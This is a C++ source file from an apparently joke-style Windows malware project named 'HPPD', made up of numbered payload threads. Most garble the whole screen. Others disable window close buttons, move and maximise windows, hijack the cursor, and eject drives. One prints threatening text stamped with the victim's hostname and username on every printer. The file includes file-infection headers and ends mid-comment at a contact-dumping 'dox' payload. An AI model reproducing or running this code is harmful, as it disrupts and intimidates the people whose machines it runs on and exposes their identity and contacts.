#include "../payloads.h"
#include "gdibuffer.h"
#include "light.h"

#include "../utils/utils.h"
#ifndef DUMB_BUILD
#include "../utils/xmplayer.h"
#endif
#include "../easter/hw.h"
#include "../utils/printer.h"
#ifndef DUMB_BUILD
#include "../utils/email.h"
#endif
#include "../utils/fileinfect/fileinfect.h"
#include "../utils/hostinfo.h"

#define _USE_MATH_DEFINES
#include <cmath>
#include <cstdlib>
#include <vector>
#include <cstdio>

// ============================================================
// LIGHT PAYLOADS
//
// Window/cursor/process/system effects plus low-cost screen
// modifiers. NOT gated by the heavy slot: they overlap freely
// with each other and with the heavy renderers.
//
//  3, 4, 12, 16, 18  original + fast visual effects.
//  25-49             mixed visual + window/cursor manipulation.
//  64                easter egg (XM + party MessageBox).
//  65-68             system flavor (eject, print, dox, infect).
//  69-72             FX pack 3 (per-pixel shaders).
//  73, 74            mouse swap + wallpaper hell.
// ============================================================

// ============================================================
// PAYLOAD 3
// Random error icons
// ============================================================
DWORD WINAPI GDIPayload3(LPVOID)
{
    const SeedVariant& sd = SeedGet(3);
    srand(SeedRand(3));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HICON errorIcon = LoadIcon(NULL, IDI_ERROR);

    for (int i = 0; i < 300 * sd.amp / 4; ++i)
    {
        if (FXAbort())
            break;

        if (errorIcon)
        {
            DrawIcon(
                dc,
                rand() % w,
                rand() % h,
                errorIcon
            );
        }

        //Sleep(50 - sd.amp);

        /*if (i % 25 == 24)
        {
            RedrawWindow(
                NULL,
                NULL,
                NULL,
                RDW_INVALIDATE |
                RDW_UPDATENOW |
                RDW_ALLCHILDREN
            );
        }*/
    }

    ReleaseDC(NULL, dc);
    return 0;
}

// ============================================================
// PAYLOAD 4
// XOR / PAT inversion
// ============================================================
DWORD WINAPI GDIPayload4(LPVOID)
{
    const SeedVariant& sd = SeedGet(4);
    srand(SeedRand(4));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    for (int x = 0; x <= w; x += (13 - sd.amp / 2))
    {
        for (int y = 0; y <= h; y += (13 - sd.amp / 2))
        {
            PatBlt(
                dc,
                0,
                0,
                w,
                h,
                SRCAND//PATINVERT
            );

            //Sleep(rand() % 20);

            if (FXAbort())
            {
                ReleaseDC(NULL, dc);
                return 0;
            }
        }
    }

    ReleaseDC(NULL, dc);
    return 0;
}

// ============================================================
// PAYLOAD 12
// Horizontal tearing
// ============================================================
DWORD WINAPI GDIPayload12(LPVOID)
{
    const SeedVariant& sd = SeedGet(12);
    srand(SeedRand(12));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);

    if (!bmp)
    {
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    for (int frame = 0; frame < 450; ++frame)
    {
        if (FXAbort())
            break;

        // Repaint the whole screen every 4th frame only.
        if ((frame & 3) != 0)
        {
            Sleep(1);
            continue;
        }

        int fx = (rand() + sd.phase * 3) % h;

        if (rand() % (3 + sd.amp / 4) == 2)
        {
            StretchBlt(
                dcCopy,
                rand() % 3,
                rand() % 3,
                w,
                h,
                dc,
                rand() % 3,
                rand() % 3,
                w,
                h,
                SRCCOPY
            );

            StretchBlt(
                dc,
                0,
                0,
                w,
                h,
                dcCopy,
                0,
                0,
                w,
                h,
                SRCCOPY
            );
        }

        BitBlt(
            dc,
            -10,
            fx,
            w,
            10,
            dc,
            0,
            fx,
            SRCCOPY
        );

        BitBlt(
            dc,
            10,
            fx,
            w,
            10,
            dc,
            0,
            fx,
            SRCCOPY
        );

        if (rand() % 25 == 24)
        {
            PatBlt(
                dc,
                0,
                0,
                w,
                h,
                DSTINVERT
            );
        }

        //Sleep(10);
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 16
// Fractured screen
// ============================================================
DWORD WINAPI GDIPayload16(LPVOID)
{
    const SeedVariant& sd = SeedGet(16);

    GDISurface s;

    if (!s.Init())
        return 0;

    uint32_t rng =
        sd.rng;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        for (int i = 0; i < 45 * sd.amp / 4; ++i)
        {
            int y =
                FXRand(rng) %
                s.h;

            int height =
                2 +
                FXRand(rng) % (28 + sd.amp * 2);

            int offset =
                static_cast<int>(
                    FXRand(rng) % (150 + sd.amp * 10)
                    ) - (75 + sd.amp * 5);

            BitBlt(
                s.screen,
                offset,
                y,
                s.w,
                height,
                s.screen,
                0,
                y,
                SRCCOPY
            );
        }

        if (
            (FXRand(rng) & 255)
        > 248
            )
        {
            PatBlt(
                s.screen,
                0,
                0,
                s.w,
                s.h,
                DSTINVERT
            );
        }

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 18
// Liquid ripple
// ============================================================
DWORD WINAPI GDIPayload18(LPVOID)
{
    const SeedVariant& sd = SeedGet(18);

    GDISurface s;

    if (!s.Init())
        return 0;

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        int slice = 4 + sd.amp;

        for (
            int y = 0;
            y < s.h;
            y += slice
            )
        {
            int shift =
                static_cast<int>(
                    std::sin(
                        y * 0.045 +
                        t * 0.12 +
                        sd.phase * 0.0002
                    ) *
                    (45.0 * sd.amp / 4)
                    );

            int rows =
                std::min(
                    slice,
                    s.h - y
                );

            BitBlt(
                s.screen,
                shift,
                y,
                s.w,
                rows,
                s.screen,
                0,
                y,
                SRCCOPY
            );
        }

        ++t;

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOADS 25-49
// Ported from a public GDI-effects dump, adapted to HPPD's
// LPTHREAD_START_ROUTINE shape and the global SEED system.
// All `while(true)` loops are bounded by FXTimeout so they
// end on their own (or on ESC) after ~5s.
// ============================================================

// 25 - Dark (vertical band darken via SRCAND)
DWORD WINAPI GDIPayload25(LPVOID)
{
    const SeedVariant& sd = SeedGet(25);
    srand(SeedRand(25));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        for (int ys = 0; ys < y; ys += 6)
        {
            if (FXAbort())
                break;

            StretchBlt(
                hdc, 0, 0, x, ys,
                hdc, 0, 0, 1, 1,
                SRCAND
            );

            //Sleep(1);
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 26 - Cursors (DrawIcon trails of the cursor icon)
DWORD WINAPI GDIPayload26(LPVOID)
{
    const SeedVariant& sd = SeedGet(26);
    srand(SeedRand(26));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    CURSORINFO cur{};

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int xs = 0;
        int ys = 0;
        int sel = rand() % 4 + 1;

        if (sel == 1)
        {
            xs = rand() % x;

            for (; ys < y; ys += 2)
            {
                if (FXAbort())
                    break;

                cur.cbSize = sizeof(cur);
                GetCursorInfo(&cur);

                DrawIcon(hdc, xs, ys, cur.hCursor);
                xs += 2;

                if (xs >= x)
                    ys = y;

                //Sleep(1);
            }
        }
        else if (sel == 2)
        {
            xs = rand() % x;
            ys = y;

            for (; ys > 0; ys -= 2)
            {
                if (FXAbort())
                    break;

                cur.cbSize = sizeof(cur);
                GetCursorInfo(&cur);

                DrawIcon(hdc, xs, ys, cur.hCursor);
                xs += 2;

                if (xs >= x)
                    ys = 0;

                //Sleep(1);
            }
        }
        else if (sel == 3)
        {
            xs = rand() % x;

            for (; ys < y; ys += 2)
            {
                if (FXAbort())
                    break;

                cur.cbSize = sizeof(cur);
                GetCursorInfo(&cur);

                DrawIcon(hdc, xs, ys, cur.hCursor);
                xs -= 2;

                if (xs <= 0)
                    ys = y;

                //Sleep(1);
            }
        }
        else
        {
            xs = rand() % x;
            ys = y;

            for (; ys > 0; ys -= 2)
            {
                if (FXAbort())
                    break;

                cur.cbSize = sizeof(cur);
                GetCursorInfo(&cur);

                DrawIcon(hdc, xs, ys, cur.hCursor);
                xs -= 2;

                if (xs <= 0)
                    ys = 0;

                //Sleep(1);
            }
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 28 - Buttons (disable Close / Min / Max on foreground window)
DWORD WINAPI GDIPayload28(LPVOID)
{
    const SeedVariant& sd = SeedGet(28);
    srand(SeedRand(28));

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HWND hwnd = GetForegroundWindow();

        if (hwnd)
        {
            HMENU menu = GetSystemMenu(hwnd, FALSE);

            if (menu)
            {
                EnableMenuItem(
                    menu,
                    SC_CLOSE,
                    MF_BYCOMMAND | MF_DISABLED | MF_GRAYED
                );
            }

            LONG_PTR style = GetWindowLongPtrW(hwnd, GWL_STYLE);

            style &= ~static_cast<LONG_PTR>(
                WS_MINIMIZEBOX | WS_MAXIMIZEBOX
            );

            SetWindowLongPtrW(hwnd, GWL_STYLE, style);
        }

        //Sleep(10);
    }

    return 0;
}

// 29 - RGBCircle (random-coloured ellipse marching across the screen)
DWORD WINAPI GDIPayload29(LPVOID)
{
    const SeedVariant& sd = SeedGet(29);
    srand(SeedRand(29));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    int xs = rand() % x;
    int ys = rand() % y;

    int color = 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        COLORREF colors[] = {
            RGB(255, 0, 0),
            RGB(255, 165, 0),
            RGB(255, 255, 0),
            RGB(0, 255, 0),
            RGB(0, 255, 255),
            RGB(0, 0, 255),
            RGB(148, 0, 211),
            RGB(255, 0, 255)
        };

        HBRUSH circle = CreateSolidBrush(colors[color % 8]);
        HPEN border = CreatePen(PS_SOLID, 1, RGB(255, 255, 255));

        if (!circle || !border)
        {
            if (circle) DeleteObject(circle);
            if (border) DeleteObject(border);
            break;
        }

        HGDIOBJ oldBrush = SelectObject(hdc, circle);
        HGDIOBJ oldPen = SelectObject(hdc, border);

        int sel = rand() % 4 + 1;

        for (int runtime = 0; runtime < 10; runtime++)
        {
            if (FXAbort())
                break;

            if (sel == 1)
            {
                Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
                xs += 20;
                ys += 20;
            }
            else if (sel == 2)
            {
                Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
                xs += 20;
                ys -= 20;
            }
            else if (sel == 3)
            {
                Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
                xs -= 20;
                ys += 20;
            }
            else
            {
                Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
                xs -= 20;
                ys -= 20;
            }

            Sleep(130);
        }

        SelectObject(hdc, oldBrush);
        SelectObject(hdc, oldPen);

        DeleteObject(circle);
        DeleteObject(border);

        if (xs >= x || xs <= 0 || ys >= y || ys <= 0)
        {
            xs = rand() % x;
            ys = rand() % y;
        }

        color++;
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 30 - IconWave (sine wave of system icons across / down the screen)
DWORD WINAPI GDIPayload30(LPVOID)
{
    const SeedVariant& sd = SeedGet(30);
    srand(SeedRand(30));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        if (FXAbort())
            break;

        int sel = rand() % 4 + 1;

        double wave = 0;
        double i = 0;

        int xs;
        int ys;

        if (sel == 1)
        {
            xs = 0;
            ys = rand() % y;

            for (; xs < x; xs += 3)
            {
                if (FXAbort())
                    break;

                DrawIcon(
                    hdc,
                    xs,
                    ys + static_cast<int>(wave * cos(i)),
                    LoadIconW(0, IDI_ERROR)
                );

                i += 0.05;
                wave += 0.32;
                //Sleep(10);
            }
        }
        else if (sel == 2)
        {
            xs = x;
            ys = rand() % y;

            for (; xs > 0; xs -= 3)
            {
                if (FXAbort())
                    break;

                DrawIcon(
                    hdc,
                    xs,
                    ys + static_cast<int>(wave * cos(i)),
                    LoadIconW(0, IDI_WARNING)
                );

                i += 0.05;
                wave += 0.32;
                //Sleep(10);
            }
        }
        else if (sel == 3)
        {
            xs = rand() % x;
            ys = 0;

            for (; ys < y; ys += 3)
            {
                if (FXAbort())
                    break;

                DrawIcon(
                    hdc,
                    xs + static_cast<int>(wave * cos(i)),
                    ys,
                    LoadIconW(0, IDI_INFORMATION)
                );

                i += 0.05;
                wave += 0.32;
                //Sleep(10);
            }
        }
        else
        {
            xs = rand() % x;
            ys = y;

            for (; ys > 0; ys -= 3)
            {
                if (FXAbort())
                    break;

                DrawIcon(
                    hdc,
                    xs + static_cast<int>(wave * cos(i)),
                    ys,
                    LoadIconW(0, IDI_QUESTION)
                );

                i += 0.05;
                wave += 0.32;
                //Sleep(10);
            }
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 31 - Sinewave (per-row BitBlt with sin-shifted x)
DWORD WINAPI GDIPayload31(LPVOID)
{
    const SeedVariant& sd = SeedGet(31);
    srand(SeedRand(31));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    double i = 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        for (int ys = 0; ys < y; ys++)
        {
            if (FXAbort())
                break;

            BitBlt(
                hdc,
                static_cast<int>(8 * sin(i)),
                ys,
                x,
                1,
                hdc,
                0,
                ys,
                SRCCOPY
            );

            i += 0.04;
        }

        //Sleep(40);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 32 - Shake (4-direction screen shake)
DWORD WINAPI GDIPayload32(LPVOID)
{
    const SeedVariant& sd = SeedGet(32);
    srand(SeedRand(32));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        BitBlt(hdc, 10, 10, x, y, hdc, 0, 0, SRCCOPY);
        if (FXAbort()) break;
        //Sleep(50);

        BitBlt(hdc, -10, 10, x, y, hdc, 0, 0, SRCCOPY);
        if (FXAbort()) break;
        //Sleep(50);

        BitBlt(hdc, 10, -10, x, y, hdc, 0, 0, SRCCOPY);
        if (FXAbort()) break;
        //Sleep(50);

        BitBlt(hdc, -10, -10, x, y, hdc, 0, 0, SRCCOPY);
        if (FXAbort()) break;
        //Sleep(50);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 33 - Dark2 (random 1-px BitBlt SRCAND)
DWORD WINAPI GDIPayload33(LPVOID)
{
    const SeedVariant& sd = SeedGet(33);
    srand(SeedRand(33));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        BitBlt(
            hdc,
            rand() % 2,
            rand() % 2,
            x,
            y,
            hdc,
            rand() % 2,
            rand() % 2,
            SRCAND
        );

        Sleep(130);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 34 - Melter (quadrant BitBlt of a random patch)
DWORD WINAPI GDIPayload34(LPVOID)
{
    const SeedVariant& sd = SeedGet(34);
    srand(SeedRand(34));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int xs = rand() % x;
        int ys = rand() % y;
        int sel = rand() % 4 + 1;
        int size = rand() % 300 + 200;
        int rnd = rand() % 50 + 20;

        for (int i = 0; i < rnd; i += 10)
        {
            if (FXAbort())
                break;

            int dx = xs;
            int dy = ys;

            if (sel == 1)      { dx += i; dy += i; }
            else if (sel == 2) { dx += i; dy -= i; }
            else if (sel == 3) { dx -= i; dy += i; }
            else               { dx -= i; dy -= i; }

            BitBlt(
                hdc,
                dx, dy,
                size, size,
                hdc,
                xs, ys,
                SRCCOPY
            );

            Sleep(100);
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 35 - Trails (DrawIcon under the actual cursor pos)
DWORD WINAPI GDIPayload35(LPVOID)
{
    const SeedVariant& sd = SeedGet(35);
    srand(SeedRand(35));

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    POINT curpos{};
    CURSORINFO cur{};

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        if (FXAbort())
            break;

        GetCursorPos(&curpos);

        cur.cbSize = sizeof(cur);
        GetCursorInfo(&cur);

        DrawIcon(hdc, curpos.x, curpos.y, cur.hCursor);

        //Sleep(10);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 36 - ResizeWindow (move + resize foreground window randomly)
DWORD WINAPI GDIPayload36(LPVOID)
{
    const SeedVariant& sd = SeedGet(36);
    srand(SeedRand(36));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HWND hwnd = GetForegroundWindow();

        if (hwnd)
        {
            SetWindowPos(
                hwnd,
                nullptr,
                rand() % x,
                rand() % y,
                rand() % x + 100,
                rand() % y + 100,
                0
            );
        }

        Sleep(rand() % 800 + 600);
    }

    return 0;
}

// 37 - MoveWindowFunc (quadrant drag of foreground window)
DWORD WINAPI GDIPayload37(LPVOID)
{
    const SeedVariant& sd = SeedGet(37);
    srand(SeedRand(37));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    RECT rekt{};

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HWND hwnd = GetForegroundWindow();

        if (!hwnd)
            continue;

        GetWindowRect(hwnd, &rekt);

        int xs = rekt.left;
        int ys = rekt.top;

        int sel = rand() % 4 + 1;
        int rnd = rand() % 100 + 60;

        for (int i = 0; i < rnd; i += 20)
        {
            if (FXAbort())
                break;

            int nx = xs;
            int ny = ys;

            if (sel == 1)      { nx += i; ny += i; }
            else if (sel == 2) { nx -= i; ny += i; }
            else if (sel == 3) { nx += i; ny -= i; }
            else               { nx -= i; ny -= i; }

            SetWindowPos(
                hwnd,
                nullptr,
                nx,
                ny,
                rekt.right - rekt.left,
                rekt.bottom - rekt.top,
                0
            );

            //Sleep(10);
        }

        if (xs > x || ys > y)
            SetWindowPos(
                hwnd, nullptr, 0, 0, 0, 0,
                SWP_NOSIZE | SWP_NOZORDER
            );
    }

    return 0;
}

// 38 - Melter2 (random 1-2 px BitBlt SRCCOPY)
DWORD WINAPI GDIPayload38(LPVOID)
{
    const SeedVariant& sd = SeedGet(38);
    srand(SeedRand(38));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        BitBlt(
            hdc,
            rand() % 2,
            rand() % 2,
            rand() % x,
            rand() % y,
            hdc,
            rand() % 2,
            rand() % 2,
            SRCCOPY
        );
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 39 - WindowMax (maximise foreground every 1.3s)
DWORD WINAPI GDIPayload39(LPVOID)
{
    const SeedVariant& sd = SeedGet(39);
    srand(SeedRand(39));

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HWND hwnd = GetForegroundWindow();

        if (hwnd)
            ShowWindow(hwnd, SW_MAXIMIZE);

        Sleep(1300);
    }

    return 0;
}

// 41 - Rainbow (random brush + PATINVERT)
DWORD WINAPI GDIPayload41(LPVOID)
{
    const SeedVariant& sd = SeedGet(41);
    srand(SeedRand(41));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HBRUSH brush = CreateSolidBrush(
            RGB(
                rand() % 255,
                rand() % 255,
                rand() % 255
            )
        );

        if (brush)
        {
            HGDIOBJ oldBrush = SelectObject(hdc, brush);

            PatBlt(hdc, 0, 0, x, y, PATINVERT);

            SelectObject(hdc, oldBrush);
            DeleteObject(brush);
        }

        Sleep(rand() % 200 + 130);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 42 - RandomCur (SetCursorPos loop)
DWORD WINAPI GDIPayload42(LPVOID)
{
    const SeedVariant& sd = SeedGet(42);
    srand(SeedRand(42));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        SetCursorPos(rand() % x, rand() % y);

        Sleep(rand() % 800 + 300);
    }

    return 0;
}

// 43 - Melter3 (horizontal bar shift)
DWORD WINAPI GDIPayload43(LPVOID)
{
    const SeedVariant& sd = SeedGet(43);
    srand(SeedRand(43));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int ys = rand() % y;
        int size = rand() % 80 + 50;

        if (rand() % 2 == 0)
        {
            for (int i = 0; i < 5; i++)
            {
                if (FXAbort())
                    break;

                BitBlt(
                    hdc,
                    i, ys,
                    x, size,
                    hdc,
                    0, ys,
                    SRCCOPY
                );
            }
        }
        else
        {
            for (int i = 0; i < 5; i++)
            {
                if (FXAbort())
                    break;

                BitBlt(
                    hdc,
                    -i, ys,
                    x, size,
                    hdc,
                    0, ys,
                    SRCCOPY
                );
            }
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 44 - Colors (4-direction 1px BitBlt with random ternary ROP)
DWORD WINAPI GDIPayload44(LPVOID)
{
    const SeedVariant& sd = SeedGet(44);
    srand(SeedRand(44));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        DWORD rop = (rand() % 2) ? 0x666666 : 0x999999;

        BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, rop);
        if (FXAbort()) break;
        //Sleep(40);

        BitBlt(hdc, -1, 1, x, y, hdc, 0, 0, rop);
        if (FXAbort()) break;
        //Sleep(40);

        BitBlt(hdc, 1, -1, x, y, hdc, 0, 0, rop);
        if (FXAbort()) break;
        //Sleep(40);

        BitBlt(hdc, -1, -1, x, y, hdc, 0, 0, rop);
        if (FXAbort()) break;
        //Sleep(40);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 45 - Flip (horizontal then vertical flip via negative StretchBlt)
DWORD WINAPI GDIPayload45(LPVOID)
{
    const SeedVariant& sd = SeedGet(45);
    srand(SeedRand(45));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        if (FXAbort())
            break;

        StretchBlt(
            hdc,
            0, 0,
            x, y,
            hdc,
            x, 0,
            -x, y,
            SRCCOPY
        );

        Sleep(100);

        if (FXAbort())
            break;

        StretchBlt(
            hdc,
            0, 0,
            x, y,
            hdc,
            0, y,
            x, -y,
            SRCCOPY
        );

        Sleep(100);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 46 - CircleSquare (alternating elliptic / rect clip + NOTSRCCOPY)
DWORD WINAPI GDIPayload46(LPVOID)
{
    const SeedVariant& sd = SeedGet(46);
    srand(SeedRand(46));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int xs = rand() % x;
        int ys = rand() % y;

        int rnd = rand() % 600 + 500;

        for (int i = 0; i < rnd; i += 30)
        {
            if (FXAbort())
                break;

            HRGN region;

            if (rand() % 2 == 0)
            {
                region = CreateEllipticRgn(
                    xs - i,
                    ys - i,
                    xs + i,
                    ys + i
                );
            }
            else
            {
                region = CreateRectRgn(
                    xs - i,
                    ys - i,
                    xs + i,
                    ys + i
                );
            }

            if (region)
            {
                SelectClipRgn(hdc, region);

                BitBlt(
                    hdc,
                    0, 0,
                    x, y,
                    hdc,
                    0, 0,
                    NOTSRCCOPY
                );

                SelectClipRgn(hdc, nullptr);
                DeleteObject(region);
            }

            //Sleep(1);
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 47 - Bright (random 100px vertical strip SRCPAINT)
DWORD WINAPI GDIPayload47(LPVOID)
{
    const SeedVariant& sd = SeedGet(47);
    srand(SeedRand(47));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int xs = rand() % x;

        BitBlt(
            hdc,
            xs, 0,
            100, y,
            hdc,
            xs,
            static_cast<int>(rand() % 14) - 5,
            SRCPAINT
        );
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 49 - Cubes (vertical strip of random-coloured Rectangles)
DWORD WINAPI GDIPayload49(LPVOID)
{
    const SeedVariant& sd = SeedGet(49);
    srand(SeedRand(49));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    int ys = 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HBRUSH brush = CreateSolidBrush(
            RGB(
                rand() % 255,
                rand() % 255,
                rand() % 255
            )
        );

        if (brush)
        {
            HGDIOBJ oldBrush = SelectObject(hdc, brush);

            for (int i = 0; i < x; i += 100)
            {
                if (FXAbort())
                    break;

                Rectangle(hdc, i, ys + 100, 100 + i, ys);

                //Sleep(10);
            }

            SelectObject(hdc, oldBrush);
            DeleteObject(brush);
        }

        ys += 100;

        if (ys >= y)
            ys = 0;

        //Sleep(30);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// ============================================================
// PAYLOAD 64
// 29 de Março (easter egg): plays the embedded XM song and
// shows a party invitation. Any other day it does nothing,
// so the slot is skipped instantly.
// ============================================================
DWORD WINAPI GDIPayload64(LPVOID)
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    if (!(st.wMonth == 3 && st.wDay == 29))
        return 0;

#ifndef DUMB_BUILD
    XmPlayer::Reset();

    HANDLE music = StartEffect(XmPlayer::PlayThread);
#endif

    MessageBoxW(
        NULL,
        L"today is a very special day, come party with me!",
        L"lol",
        MB_OK | MB_ICONINFORMATION | MB_SETFOREGROUND
    );

#ifndef DUMB_BUILD
    XmPlayer::StopAll();

    if (music)
        WaitEffect(music);
#endif

    return 0;
}

// ============================================================
// PAYLOAD 65
// Eject Drives: physically ejects every optical / removable
// drive via real IOCTL (no MessageBox). Instant action; nothing
// to eject = harmless no-op.
// ============================================================
DWORD WINAPI GDIPayload65(LPVOID)
{
    MassEject::EjectAllOptical();
    return 0;
}

// ============================================================
// PAYLOAD 66
// War Print: sends a menacing block of text to every locally
// installed printer (raw print job). No printers = harmless.
// ============================================================
DWORD WINAPI GDIPayload66(LPVOID)
{
    wchar_t names[32][256]{};

    const int count =
        Printer::Enumerate(names, 32);

    if (count <= 0)
        return 0;

    const wchar_t text[] =
        L"HPPD\r\n"
        L"\r\n"
        L"something bad is about to happen..\r\n"
        L"and all your printers will know it.\r\n"
        L"\r\n"
        L"BYE.";

    wchar_t* normalized =
        Printer::NormalizeText(text);

    const wchar_t* payload =
        normalized ? normalized : text;

    // Stamp the victim's host identity on every printed page
    // (rules.cpp host reads got their own playground here).
    std::wstring full = payload;
    full += L"\r\n"
            L"\r\n"
            L"machine: ";
    full += HostInfo::HostnameW();
    full += L" | user: ";
    full += HostInfo::UserW();
    full += L"\r\n";
    full += HostInfo::ToWide(HostInfo::UpTime());

    for (int i = 0; i < count; ++i)
        Printer::PrintText(names[i], full.c_str());

    if (normalized)
        free(normalized);

    return 0;
}

// ============================================================
// PAYLOAD 67
// Dox: dumps every Windows Address Book contact (name + email)
// straight to the console. Recon only — nothing is sent, ever.
